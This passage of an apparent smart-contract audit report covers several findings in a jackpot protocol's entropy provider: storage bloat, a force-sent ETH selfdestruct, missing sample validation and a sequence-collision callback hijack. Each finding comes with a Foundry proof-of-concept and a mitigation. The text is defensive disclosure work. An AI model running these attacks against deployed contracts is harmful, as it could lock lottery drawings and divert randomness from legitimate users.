        uint256[] memory idB = jp.buyTickets(ts, userB, new address[](0), new uint256[](0), bytes32("SRC"));

        // Emergency refund for userA (burn NFT), then resume
        jp.enableEmergencyMode();
        vm.prank(userA);
        jp.emergencyRefundTickets(idA);
        jp.disableEmergencyMode();

        // Lock and settle with the exact winning numbers for the bought combo
        uint256 curId = jp.currentDrawingId();
        IJackpotLPManager.LPDrawingState memory beforeLP = lpm.getLPDrawingState(curId);
        Jackpot.DrawingState memory beforeDraw = jp.getDrawingState(curId);

        jp.lockJackpot();
        uint256[][] memory nums = new uint256[][](2);
        nums[0] = new uint256[](5); nums[0][0]=1; nums[0][1]=2; nums[0][2]=3; nums[0][3]=4; nums[0][4]=5; // normals
        nums[1] = new uint256[](1); nums[1][0]=1; // bonusball
        entropy.settle(jp, nums);

        uint256 nextId = jp.currentDrawingId();
        IJackpotLPManager.LPDrawingState memory afterLP = lpm.getLPDrawingState(nextId);

        // LP decreased due to phantom winner (refunded ticket still counted in settlement)
        assertGt(beforeLP.lpPoolTotal, afterLP.lpPoolTotal, "LP should decrease due to phantom winner");

        // Refunded/burned ticket cannot be claimed
        vm.startPrank(userA);
        vm.expectRevert();
        jp.claimWinnings(idA); // burned token should revert
        vm.stopPrank();

        // Real winner can claim (amount is reduced if duplicate remained in dupResult)
        uint256 balBefore = usdc.balanceOf(userB);
        vm.prank(userB);
        jp.claimWinnings(idB);
        uint256 claimed = usdc.balanceOf(userB) - balBefore;
        // Claimed > 0 confirms settlement awarded payouts and counters were used
        assertGt(claimed, 0, "winner should receive payout");
        // Optional: proves reduced per-ticket payout vs full prizePool if dupResult was counted
        // Expect <= prizePool (strictly less when duplicate counted in denominator)
        assertLe(claimed, beforeDraw.prizePool, "per-ticket payout should not exceed prize pool");
    }

    function _allFalse() internal pure returns (bool[12] memory m) { return m; }
    function _jackpotOnlyWeights() internal pure returns (uint256[12] memory w) {
        // Allocate 100% premium to jackpot tier (tier 11)
        w[11] = 1e18; return w;
    }
    function _arr5(uint8 a,uint8 b,uint8 c,uint8 d,uint8 e) internal pure returns (uint8[] memory out){ out=new uint8[](5); out[0]=a; out[1]=b; out[2]=c; out[3]=d; out[4]=e; }
}


## Suggested Mitigation
Make drawings with any emergency refunds non-recoverable and prevent settlement of that drawing, or fully unwind tracker/accounting on refund.

Options (choose one):
1) One-way cancel after refunds (recommended):
   - Track a per-drawing flag (e.g., emergencyRefundOccurred) set in emergencyRefundTickets.
   - If this flag is set, disallow runJackpot()/scaledEntropyCallback for that drawing (revert if called).
   - Add an owner-only function cancelCurrentDrawingAfterEmergency() that:
     • Requires emergencyRefundOccurred == true.
     • Calls jackpotLPManager.processDrawingSettlement(currentDrawingId, 0, 0, 0) to roll forward without applying lpEarnings or userWinnings from this drawing.
     • Resets drawing entries (initialize a fresh Tracker) and calls _setNewDrawingState with the returned newLPValue to start the next drawing.
     This guarantees no phantom winners, no over-crediting of lpEarnings for refunded tickets, and no inconsistent state reuse.

2) Full unwind on refund (more complex but preserves drawing):
   - Extend TicketComboTracker with a deleteTicket(...) function that mirrors insert() and decrements all affected subset counts and bonusballTicketCounts (both count and dupCount paths) for the specific ticket.
   - In emergencyRefundTickets, after burning, call deleteTicket(...) and also decrement any drawing-level counters that were incremented at purchase time if needed (e.g., adjust prizePool for duplicates) and reduce currentDrawingState.lpEarnings by the ticket’s contributed revenue (ticketPrice minus referral fee), ensuring accounting consistency.
   - With correct unwinding, it becomes safe to resume and settle the same drawing.

Either approach eliminates refunded tickets from winner counting and prevents lpEarnings/prizePool inconsistencies, removing LP loss and any potential winner underpayment.





 **Derived From** : Pending requests never expire; permissionless storage bloat via failing callbacks

## [L-20]. Permanent storage bloat via stuck pending requests in ScaledEntropyProvider.requestAndCallbackScaledRandomness

### Finding Severity Justification: The issue enables permissionless storage growth by persisting large pending entries when the callback target reverts. However, attackers must pay the SSTORE and entropy fees, there is no direct loss of assets, and no protocol-critical functionality iterates over or depends on clearing these entries. Impact is limited to storage bloat and potential minor gas overhead, not fund loss or a proven system-wide DoS.
## Derived From Pattern/Invariant
Pending requests never expire; permissionless storage bloat via failing callbacks

## Exploit Type
Dos

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
requestAndCallbackScaledRandomness() persists arbitrary-sized bytes context and an unbounded SetRequest[] into storage under pending[sequence]. Cleanup only happens inside entropyCallback(), but it deletes then performs an external call to the caller's selector; if that call fails (missing function, revert, or OOG), the whole tx reverts and the earlier delete rolls back, leaving the pending entry permanently stored. There is no TTL, cancel, or admin sweep. An attacker can repeatedly create requests (paying fee) with large _context and/or many SetRequest entries and make the callback fail to grow storage unboundedly.

Vulnerable snippets:
- Storage growth:
function _storePendingRequest(...) internal {
  pending[sequence].callback = msg.sender;
  pending[sequence].selector = _selector;
  pending[sequence].context = _context; // dynamic bytes to storage
  for (uint256 i = 0; i < _setRequests.length; i++) {
      pending[sequence].setRequests.push(_setRequests[i]); // unbounded push
  }
}
- Cleanup reverts on callback failure, so delete rolls back:
function entropyCallback(...) internal override {
  PendingRequest memory req = pending[sequence];
  if (req.callback == address(0)) revert UnknownSequence();
  delete pending[sequence];
  uint256[][] memory scaled = _getScaledRandomness(randomNumber, req.setRequests);
  (bool success,) = req.callback.call(abi.encodeWithSelector(req.selector, sequence, scaled, req.context));
  if (!success) revert CallbackFailed(req.selector); // rolls back deletion
}

## Impact
The issue enables unbounded storage growth by leaving large PendingRequest entries stuck if the callback target reverts (e.g., missing selector, revert, or out-of-gas). Attackers can repeatedly create such requests with large context/arrays, permanently bloating contract storage. This does not directly risk funds and attackers bear the gas and entropy fees; it also does not block unrelated users since there is no iteration over all pending entries. However, misconfiguration by an integrator (wrong selector or underestimated gas) can cause their own entries to remain stuck, and repeated failed callbacks waste gas and clutter state. Overall impact is persistent storage growth and minor gas overhead, not asset loss.

## Command to Run Test


## Proof of Concept
1) Attacker deploys a contract without the expected callback function (no fallback/receive) so any call to a selector reverts.
2) Attacker calls ScaledEntropyProvider.requestAndCallbackScaledRandomness with a very large _context and an arbitrarily long _requests array; msg.sender is the attacker contract so callback target is set to it.
3) The entropy provider later calls _entropyCallback; entropyCallback deletes pending[sequence] then calls back into the attacker's contract, which reverts. The revert bubbles up, rolling back the delete, leaving the large pending entry intact.
4) Repeat to permanently grow storage.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IEntropyConsumer} from "@pythnetwork/entropy-sdk-solidity/IEntropyConsumer.sol";

contract MockEntropy {
    uint128 public fee;
    uint64 public nextSeq = 1;

    constructor(uint128 _fee) { fee = _fee; }

    function getFeeV2(address /*provider*/, uint32 /*gasLimit*/) external view returns (uint128) {
        return fee;
    }

    function requestV2(address /*provider*/, uint32 /*gasLimit*/) external payable returns (uint64 assignedSequenceNumber) {
        require(msg.value >= fee, "fee");
        assignedSequenceNumber = nextSeq++;
    }

    function fulfill(address consumer, uint64 sequence, bytes32 random) external {
        // Calls back as the entropy contract
        IEntropyConsumer(consumer)._entropyCallback(sequence, address(0), random);
    }
}

// Attacker callback target that always reverts on unknown selector
contract RevertingCallbackTarget {
    ScaledEntropyProvider public provider;
    constructor(ScaledEntropyProvider _provider) { provider = _provider; }

    function makeRequest(
        uint32 gasLimit,
        IScaledEntropyProvider.SetRequest[] memory reqs,
        bytes4 selector,
        bytes memory ctx
    ) external payable returns (uint64) {
        return provider.requestAndCallbackScaledRandomness{value: msg.value}(gasLimit, reqs, selector, ctx);
    }
    // No fallback/receive => any call to arbitrary selector reverts
}

contract StorageBloatTest is Test {
    MockEntropy entropy;
    ScaledEntropyProvider provider;
    RevertingCallbackTarget attacker;

    function setUp() public {
        entropy = new MockEntropy(1e12); // tiny fee for test
        provider = new ScaledEntropyProvider(address(entropy), address(0xBEEF));
        attacker = new RevertingCallbackTarget(provider);
    }

    function test_PermanentPendingEntryOnCallbackFailure() public {
        // Prepare a single minimal SetRequest, but with large context to amplify storage bloat
        IScaledEntropyProvider.SetRequest[] memory reqs = new IScaledEntropyProvider.SetRequest[](1);
        reqs[0] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 2, withReplacement: true});

        uint32 gasLimit = 100_000;
        uint256 fee = provider.getFee(gasLimit);
        bytes memory ctx = new bytes(32768); // 32 KB

        // Make request from attacker contract so msg.sender is the target of the callback
        uint64 seq = attacker.makeRequest{value: fee}(gasLimit, reqs, bytes4(0xDEADBEEF), ctx);

        // Entropy attempts callback: provider deletes then calls attacker, which reverts; expect revert
        vm.expectRevert(abi.encodeWithSelector(ScaledEntropyProvider.CallbackFailed.selector, bytes4(0xDEADBEEF)));
        entropy.fulfill(address(provider), seq, bytes32(uint256(0x42)));

        // Verify pending entry persists (delete was rolled back)
        ScaledEntropyProvider.PendingRequest memory p = provider.getPendingRequest(seq);
        assertEq(p.callback, address(attacker));
        assertEq(p.selector, bytes4(0xDEADBEEF));
        assertEq(p.setRequests.length, 1);
        assertEq(p.context.length, 32768);
    }
}


## Suggested Mitigation
1) Do not revert on callback failure. Keep the current delete-before-call pattern but return early on failure and emit an event. Example:

function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override {
    PendingRequest memory req = pending[sequence];
    if (req.callback == address(0)) revert UnknownSequence();
    delete pending[sequence];

    uint256[][] memory scaled = _getScaledRandomness(randomNumber, req.setRequests);
    (bool ok, bytes memory ret) = req.callback.call(abi.encodeWithSelector(req.selector, sequence, scaled, req.context));
    if (!ok) {
        emit CallbackExecutionFailed(sequence, req.callback, req.selector, ret);
        return; // never revert so deletion cannot be rolled back
    }

    emit EntropyFulfilled(sequence, randomNumber);
    emit ScaledRandomnessDelivered(sequence, req.callback, scaled.length);
}

Add: event CallbackExecutionFailed(uint64 sequence, address callback, bytes4 selector, bytes data);

2) Bound per-request storage footprint to prevent large bloat attempts: require(_context.length <= MAX_CONTEXT), require(_requests.length <= MAX_REQUESTS), and optionally cap each SetRequest.samples and (maxRange - minRange) to sane limits.

3) Add a purge mechanism to allow cleanup of stuck entries that will never succeed: function purgePending(uint64 sequence) external { require(msg.sender == owner() || msg.sender == pending[sequence].callback, "NotAuthorized"); delete pending[sequence]; emit PendingPurged(sequence, msg.sender); }

4) (Optional) Store a createdAt timestamp in PendingRequest and allow purge after a TTL to avoid permanently stuck entries.





 **Derived From** : address(this).balance == 0

## [I-21]. Stranded ETH in ScaledEntropyProvider due to forced ETH with no recovery path

### Finding Severity Justification: The contract can receive ETH via selfdestruct and has no sweep/withdraw path, which can strand ETH. This does not affect protocol solvency, randomness flow, jackpot operations, or user/LP assets; it's non-impactful operationally and amounts would be from external senders only. No code relies on address(this).balance being zero, so impact is purely cosmetic/monitoring-related.
## Derived From Pattern/Invariant
address(this).balance == 0

## Exploit Type
UnexpectedEth

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
ScaledEntropyProvider forwards all msg.value to Pyth via entropy.requestV2{value: msg.value}, so it is expected to hold no ETH. However, ETH can be force-sent (e.g., via selfdestruct) to the contract, which lacks any withdraw/sweep method. This leaves non-zero ETH permanently stranded, violating the balance invariant and causing accounting confusion. Vulnerable snippet:

function requestAndCallbackScaledRandomness(...) external payable returns (uint64 sequence) {
    if (msg.value < getFee(_gasLimit)) revert InsufficientFee();
    ...
    sequence = entropy.requestV2{value: msg.value}(entropyProvider, _gasLimit);
    _storePendingRequest(...);
}

There is no receive/fallback handler or owner-only sweep to recover unexpected ETH.

## Impact
Permanent stranded ETH in the contract, violating the invariant that provider retains no ETH. No direct theft, but funds become unrecoverable and can mislead balance-based assumptions/monitoring.

## Command to Run Test


## Proof of Concept
1) Deploy ScaledEntropyProvider with any non-zero entropy and provider addresses.
2) Force-send ETH to the provider via a selfdestruct helper.
3) Observe address(provider).balance > 0 with no method to recover it.
4) The contract continues operating but holds stranded ETH indefinitely, violating the expected zero-balance invariant.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";

contract ForceSend {
    constructor() payable {}
    function boom(address payable target) external {
        selfdestruct(target);
    }
}

contract StrandedEthTest is Test {
    function test_ForcedETHGetsStranded() public {
        // Deploy with any non-zero addresses
        ScaledEntropyProvider provider = new ScaledEntropyProvider(address(0x1), address(0x2));
        assertEq(address(provider).balance, 0);

        // Force-send ETH via selfdestruct
        ForceSend fs = new ForceSend{value: 1 ether}();
        fs.boom(payable(address(provider)));

        // Invariant violated: provider unexpectedly holds ETH with no way to recover
        assertGt(address(provider).balance, 0);
    }
}


## Suggested Mitigation
Add an owner-only sweep to recover any unexpected ETH: function sweepETH(address payable to) external onlyOwner { (bool ok, ) = to.call{value: address(this).balance}(""); require(ok); }. Optionally add receive() external payable { revert("No direct ETH"); } to prevent accidental sends (selfdestruct remains unstoppable).





 **Derived From** : for all i in _requests: _requests[i].withReplacement || (_requests[i].samples <= (_requests[i].maxRange - _requests[i].minRange + 1))

## [L-22]. Invalid no-replacement requests pass validation and brick entropy callbacks, locking downstream consumers (e.g., Jackpot)

### Finding Severity Justification: The contract misses a validation in _validateRequests() to ensure that when withReplacement == false, samples <= (maxRange - minRange + 1). This can cause entropyCallback to revert later when FisherYatesRejection.draw() enforces the invariant. Impact is limited to the requester losing the entropy fee and the request failing to deliver randomness; it does not directly endanger protocol funds. Affecting Jackpot would require it to submit an invalid request (e.g., normalBallMax < 5), which is a governance misconfiguration and thus a QA/governance risk per rules.
## Derived From Pattern/Invariant
for all i in _requests: _requests[i].withReplacement || (_requests[i].samples <= (_requests[i].maxRange - _requests[i].minRange + 1))

## Exploit Type
IntegerMath

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
ScaledEntropyProvider._validateRequests() does not enforce the arithmetic invariant required by no-replacement sampling. When withReplacement == false, samples must be <= (maxRange - minRange + 1). The FisherYatesRejection.draw() library enforces this at runtime and reverts with "Too many draws" if violated. Because requestAndCallbackScaledRandomness() stores such invalid requests and entropyCallback() deletes pending[sequence] before generating scaled randomness, the callback reverts during draw() and the pending entry is lost. Any subsequent retry for the same sequence reverts with UnknownSequence(), permanently preventing delivery. A consumer like Jackpot that initiated the request can become stuck waiting for randomness settlement (drawing locked), and the entropy fee is lost. Vulnerable snippets:

- Missing validation:
function _validateRequests(SetRequest[] memory _requests) internal pure {
    if (_requests.length == 0) revert InvalidRequests();
    for (uint256 i = 0; i < _requests.length; i++) {
        if (_requests[i].minRange > _requests[i].maxRange) revert InvalidRange();
        if (_requests[i].samples == 0) revert InvalidSamples();
        // MISSING: if (!_requests[i].withReplacement) require(samples <= maxRange - minRange + 1)
    }
}

- Callback deletes state before arithmetic failure:
function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override {
    PendingRequest memory req = pending[sequence];
    if (req.callback == address(0)) revert UnknownSequence();
    delete pending[sequence];
    uint256[][] memory scaledRandomNumbers = _getScaledRandomness(randomNumber, req.setRequests);
    ...
}

- Library revert on invariant violation:
require(count <= maxRange - minRange + 1, "Too many draws");

## Impact
Functional DoS and fee loss: The entropy callback reverts and the pending request is deleted, bricking the sequence. Downstream consumers (e.g., Jackpot) remain locked waiting for randomness, blocking drawing settlement and requiring emergency procedures. The entropy fee paid is lost.

## Command to Run Test


## Proof of Concept
1) An unprivileged consumer contract calls requestAndCallbackScaledRandomness with a no-replacement SetRequest where samples > (maxRange - minRange + 1). The request passes _validateRequests and is stored.
2) The entropy provider later invokes entropyCallback. ScaledEntropyProvider deletes pending[sequence], then _getScaledRandomness() calls FisherYatesRejection.draw(...), which reverts with "Too many draws".
3) The callback fails; the pending entry has been deleted, so a retry for the same sequence reverts with UnknownSequence(). The consumer is stuck; Jackpot would remain locked if it had made such a request, losing the entropy fee and halting progress.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

library FisherYatesRejection {
    uint256 constant MAX_UINT = type(uint256).max;
    function draw(uint256 minRange, uint256 maxRange, uint256 count, uint256 seed) external pure returns (uint256[] memory result) {
        require(count <= maxRange - minRange + 1, "Too many draws");
        uint256 rangeSize = maxRange - minRange + 1;
        uint256[] memory pool = new uint256[](rangeSize);
        for (uint256 i = 0; i < rangeSize; i++) { pool[i] = i + minRange; }
        uint256 nonce = 0;
        for (uint256 i = rangeSize - 1; i > 0; i--) {
            uint256 rand;
            while (true) {
                rand = uint256(keccak256(abi.encode(seed, nonce)));
                uint256 limit = (MAX_UINT / (i + 1)) * (i + 1);
                if (rand < limit) { rand = rand % (i + 1); break; }
                nonce++;
            }
            (pool[i], pool[rand]) = (pool[rand], pool[i]);
            nonce++;
        }
        result = new uint256[](count);
        for (uint256 j = 0; j < count; j++) { result[j] = pool[j]; }
    }
}

abstract contract IEntropyConsumer {
    function _entropyCallback(uint64 sequence, address provider, bytes32 randomNumber) external {
        address entropy = getEntropy();
        require(entropy != address(0), "Entropy address not set");
        require(msg.sender == entropy, "Only Entropy can call this function");
        entropyCallback(sequence, provider, randomNumber);
    }
    function getEntropy() internal view virtual returns (address);
    function entropyCallback(uint64 sequence, address provider, bytes32 randomNumber) internal virtual;
}

interface IEntropyV2 {
    function requestV2(address provider, uint32 gasLimit) external payable returns (uint64 assignedSequenceNumber);
    function getFeeV2(address provider, uint32 gasLimit) external view returns (uint128 feeAmount);
}

contract ScaledEntropyProvider is IEntropyConsumer {
    struct SetRequest { uint8 samples; uint256 minRange; uint256 maxRange; bool withReplacement; }
    struct PendingRequest { address callback; bytes4 selector; bytes context; bytes32 userRandomNumber; SetRequest[] setRequests; }

    event ScaledRandomnessDelivered(uint64 indexed sequence, address indexed callback, uint256 samples);
    event EntropyFulfilled(uint64 indexed sequence, bytes32 randomNumber);

    error InvalidCallback(); error CallbackFailed(bytes4 selector); error ZeroAddress(); error InvalidSelector(); error InvalidRequests(); error InvalidRange(); error InvalidSamples(); error InsufficientFee(); error UnknownSequence();

    IEntropyV2 private entropy; address private entropyProvider; mapping(uint64 => PendingRequest) private pending;

    constructor(address _entropy, address _entropyProvider) { if (_entropy == address(0)) revert ZeroAddress(); if (_entropyProvider == address(0)) revert ZeroAddress(); entropy = IEntropyV2(_entropy); entropyProvider = _entropyProvider; }

    function requestAndCallbackScaledRandomness(uint32 _gasLimit, SetRequest[] memory _requests, bytes4 _selector, bytes memory _context) external payable returns (uint64 sequence) {
        if (msg.value < getFee(_gasLimit)) revert InsufficientFee();
        if (_selector == bytes4(0)) revert InvalidSelector();
        _validateRequests(_requests);
        sequence = entropy.requestV2{value: msg.value}(entropyProvider, _gasLimit);
        _storePendingRequest(sequence, _selector, _context, _requests);
    }

    function getFee(uint32 _gasLimit) public view returns (uint256) { return entropy.getFeeV2(entropyProvider, _gasLimit); }
    function getEntropyContract() external view returns (address) { return address(entropy); }
    function getPendingRequest(uint64 sequence) external view returns (PendingRequest memory) { return pending[sequence]; }

    function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override {
        PendingRequest memory req = pending[sequence];
        if (req.callback == address(0)) revert UnknownSequence();
        delete pending[sequence];
        uint256[][] memory scaledRandomNumbers = _getScaledRandomness(randomNumber, req.setRequests);
        (bool success, ) = req.callback.call(abi.encodeWithSelector(req.selector, sequence, scaledRandomNumbers, req.context));
        if (!success) revert CallbackFailed(req.selector);
        emit EntropyFulfilled(sequence, randomNumber);
        emit ScaledRandomnessDelivered(sequence, req.callback, scaledRandomNumbers.length);
    }

    function _getScaledRandomness(bytes32 _randomNumber, SetRequest[] memory _setRequests) internal pure returns (uint256[][] memory requestsOutputs) {
        requestsOutputs = new uint256[][](_setRequests.length);
        for (uint256 i = 0; i < _setRequests.length; i++) {
            if (!_setRequests[i].withReplacement) {
                requestsOutputs[i] = FisherYatesRejection.draw(_setRequests[i].minRange, _setRequests[i].maxRange, _setRequests[i].samples, uint256(_randomNumber));
            } else {
                requestsOutputs[i] = _drawWithReplacement(_setRequests[i].minRange, _setRequests[i].maxRange, _setRequests[i].samples, uint256(_randomNumber));
            }
        }
    }

    function getEntropy() internal view override returns (address) { return address(entropy); }

    function _validateRequests(SetRequest[] memory _requests) internal pure {
        if (_requests.length == 0) revert InvalidRequests();
        for (uint256 i = 0; i < _requests.length; i++) {
            if (_requests[i].minRange > _requests[i].maxRange) revert InvalidRange();
            if (_requests[i].samples == 0) revert InvalidSamples();
            // BUG: missing invariant check for no-replacement requests
        }
    }

    function _storePendingRequest(uint64 sequence, bytes4 _selector, bytes memory _context, SetRequest[] memory _setRequests) internal {
        pending[sequence].callback = msg.sender; pending[sequence].selector = _selector; pending[sequence].context = _context;
        for (uint256 i = 0; i < _setRequests.length; i++) { pending[sequence].setRequests.push(_setRequests[i]); }
    }

    function _drawWithReplacement(uint256 _minRange, uint256 _maxRange, uint8 _samples, uint256 _randomNumber) internal pure returns (uint256[] memory) {
        uint256[] memory result = new uint256[](_samples); uint256 range = _maxRange - _minRange + 1; uint256 nonce = 0;
        for (uint256 i = 0; i < _samples; i++) {
            uint256 rand; while (true) { rand = uint256(keccak256(abi.encode(_randomNumber, nonce))); uint256 limit = (type(uint256).max / range) * range; if (rand < limit) { result[i] = uint256((rand % range) + _minRange); break; } nonce++; } nonce++; }
        return result;
    }
}

contract MockEntropy is IEntropyV2 {
    uint64 public lastSeq;
    function requestV2(address, uint32) external payable returns (uint64 assignedSequenceNumber) { lastSeq += 1; return lastSeq; }
    function getFeeV2(address, uint32) external view returns (uint128) { return 0; }
    function triggerCallback(ScaledEntropyProvider target, uint64 sequence, bytes32 rnd) external { target._entropyCallback(sequence, address(this), rnd); }
}

contract DummyConsumer {
    ScaledEntropyProvider public provider; bool internal called; uint64 public lastSeq;
    constructor(ScaledEntropyProvider p) { provider = p; }
    function requestInvalid() external payable returns (uint64 seq) {
        ScaledEntropyProvider.SetRequest[] memory reqs = new ScaledEntropyProvider.SetRequest[](1);
        reqs[0] = ScaledEntropyProvider.SetRequest({ samples: 2, minRange: 1, maxRange: 1, withReplacement: false });
        seq = provider.requestAndCallbackScaledRandomness(100000, reqs, this.onRNG.selector, bytes(""));
        lastSeq = seq;
    }
    function onRNG(uint64, uint256[][] memory, bytes memory) external { called = true; }
    function wasCalled() external view returns (bool) { return called; }
}

contract InvariantArithmeticTest is Test {
    function test_NoReplacementTooManySamples_BricksPendingAndReverts() public {
        MockEntropy entropy = new MockEntropy();
        ScaledEntropyProvider provider = new ScaledEntropyProvider(address(entropy), address(0xBEEF));
        DummyConsumer consumer = new DummyConsumer(provider);
        uint64 seq = consumer.requestInvalid();
        // Pending is stored
        ScaledEntropyProvider.PendingRequest memory pr1 = provider.getPendingRequest(seq);
        assertEq(pr1.callback, address(consumer));
        // Callback reverts from arithmetic invariant violation (Too many draws)
        vm.expectRevert(bytes("Too many draws"));
        entropy.triggerCallback(provider, seq, bytes32(uint256(123)));
        // Pending was deleted before revert -> lost forever
        ScaledEntropyProvider.PendingRequest memory pr2 = provider.getPendingRequest(seq);
        assertEq(pr2.callback, address(0));
        // Retry for same sequence now reverts with UnknownSequence
        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        entropy.triggerCallback(provider, seq, bytes32(uint256(456)));
        // Consumer never received callback
        assertEq(consumer.wasCalled(), false);
    }
}


## Suggested Mitigation
- Enforce the arithmetic invariant at request time:

  function _validateRequests(SetRequest[] memory _requests) internal pure {
      if (_requests.length == 0) revert InvalidRequests();
      for (uint256 i = 0; i < _requests.length; i++) {
          if (_requests[i].minRange > _requests[i].maxRange) revert InvalidRange();
          if (_requests[i].samples == 0) revert InvalidSamples();
          if (!_requests[i].withReplacement) {
              uint256 range = _requests[i].maxRange - _requests[i].minRange + 1;
              if (_requests[i].samples > range) revert InvalidSamples();
          }
      }
  }

- Additionally reduce blast radius by deleting pending[sequence] only after scaled randomness generation and a successful callback. This allows the entropy provider to retry the callback on transient failures without losing the pending request.





 **Derived From** : pending[sequence].callback == msg.sender && pending[sequence].selector == _selector && pending[sequence].setRequests.length == _requests.length

## [M-23]. Provider switch lets attacker collide sequence keys and overwrite pending[sequence], hijacking/DoSing entropy callbacks

### Finding Severity Justification: Pending requests are keyed only by sequence and the provider parameter is ignored on callback. After an owner-permitted provider rotation, a permissionless caller can collide a new provider’s sequence with an old pending one and overwrite the stored callback/selector. This can hijack or, more commonly, DoS the legitimate entropy delivery (e.g., Jackpot never receives the callback and remains locked). This impacts protocol availability but does not directly steal funds, fitting Medium severity.
## Derived From Pattern/Invariant
pending[sequence].callback == msg.sender && pending[sequence].selector == _selector && pending[sequence].setRequests.length == _requests.length

## Exploit Type
StorageLayout

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
ScaledEntropyProvider keys pending requests only by sequence (uint64) and ignores the provider dimension. On setEntropyProvider(), the new provider's sequence numbers commonly restart from a low value, so new requests can reuse an existing sequence still pending from the old provider. _storePendingRequest then overwrites pending[sequence].callback/selector and appends to setRequests without clearing it. This breaks the referential invariant (setRequests length != input; callback no longer original caller) and lets an attacker, after a provider rotation, drive the new provider's sequence up to the old pending sequence and overwrite it. When Pyth later calls back for the old sequence, ScaledEntropyProvider will deliver randomness to the attacker’s callback (or revert due to bloated setRequests), leaving the original consumer (e.g., Jackpot) without entropy and locking the drawing. Vulnerable snippet:

mapping(uint64 => PendingRequest) private pending; // no provider dimension

function _storePendingRequest(uint64 sequence, bytes4 _selector, bytes memory _context, SetRequest[] memory _setRequests) internal {
    pending[sequence].callback = msg.sender;        // overwrites previous
    pending[sequence].selector = _selector;         // overwrites previous
    pending[sequence].context = _context;
    for (uint256 i = 0; i < _setRequests.length; i++) {
        pending[sequence].setRequests.push(_setRequests[i]); // appends; no clear
    }
}

function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override {
    PendingRequest memory req = pending[sequence];   // looks up by sequence only; ignores provider
    ...
}

## Impact
After the owner rotates the entropy provider while there are still pending requests for the old provider, a permissionless caller can issue a new request on the new provider with a colliding sequence number. Because pending requests are keyed only by sequence and the provider parameter is ignored during callback, the new request overwrites the old pending entry’s callback/selector and appends to its setRequests. When the Entropy contract later calls back for the old provider and that same sequence, ScaledEntropyProvider will deliver the randomness to the attacker’s callback (or at least not to the original consumer), leaving the legitimate consumer (e.g., Jackpot) without entropy and stuck. This enables reliable, low-cost DoS of entropy delivery and can stall protocol operations, but does not directly steal funds.

## Command to Run Test


## Proof of Concept
1) Assume a pending request exists for provider0 with sequence s.
2) Owner rotates the configured entropy provider to provider1.
3) Attacker repeatedly calls requestAndCallbackScaledRandomness on the new provider until the returned sequence equals s (often immediately for s=1 after rotation).
4) Because pending is keyed only by sequence, _storePendingRequest overwrites pending[s].callback/selector and appends its own SetRequest to the existing array.
5) When Entropy later invokes _entropyCallback(s, provider0, random), ScaledEntropyProvider ignores provider, loads pending[s], and calls the attacker’s callback instead of the original consumer. The original consumer never receives entropy and remains locked.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import { ScaledEntropyProvider } from "contracts/ScaledEntropyProvider.sol";
import { IScaledEntropyProvider } from "contracts/interfaces/IScaledEntropyProvider.sol";

contract EntropyMock {
    mapping(address => uint64) public seq;

    function getFeeV2(address /*provider*/, uint32 /*gasLimit*/) external pure returns (uint128) {
        return 1;
    }

    function requestV2(address provider, uint32 /*gasLimit*/) external payable returns (uint64) {
        require(msg.value >= 1, "fee");
        seq[provider] += 1;
        return seq[provider];
    }
}

contract JackpotMock {
    bool public gotCalled;
    uint256 public len;

    function onEntropy(uint64 /*seq*/, uint256[][] memory rnd, bytes memory /*ctx*/) external {
        gotCalled = true;
        len = rnd.length;
    }
}

contract AttackConsumer {
    bool public gotCalled;
    uint256 public lastLen;

    function hackedCallback(uint64 /*seq*/, uint256[][] memory rnd, bytes memory /*ctx*/) external {
        gotCalled = true;
        lastLen = rnd.length;
    }
}

contract SequenceCollisionHijackTest is Test {
    EntropyMock entropy;
    ScaledEntropyProvider sep;
    address provider0 = address(0x1000);
    address provider1 = address(0x2000);

    JackpotMock jackpot;
    AttackConsumer attacker;

    function setUp() public {
        entropy = new EntropyMock();
        sep = new ScaledEntropyProvider(address(entropy), provider0);
        jackpot = new JackpotMock();
        attacker = new AttackConsumer();
    }

    function test_provider_switch_sequence_collision_hijacks_callback() public {
        // Original consumer makes a request on old provider (sequence expected = 1)
        IScaledEntropyProvider.SetRequest[] memory reqA = new IScaledEntropyProvider.SetRequest[](2);
        reqA[0] = IScaledEntropyProvider.SetRequest({samples: 5, minRange: 1, maxRange: 10, withReplacement: false});
        reqA[1] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 10, withReplacement: true});

        vm.prank(address(jackpot));
        uint64 s0 = sep.requestAndCallbackScaledRandomness{value: 1}(100_000, reqA, JackpotMock.onEntropy.selector, "");
        assertEq(s0, 1, "old provider seq should be 1");

        // Owner rotates provider (normal operation)
        sep.setEntropyProvider(provider1);

        // Attacker creates a request on new provider; first new seq = 1 (collision)
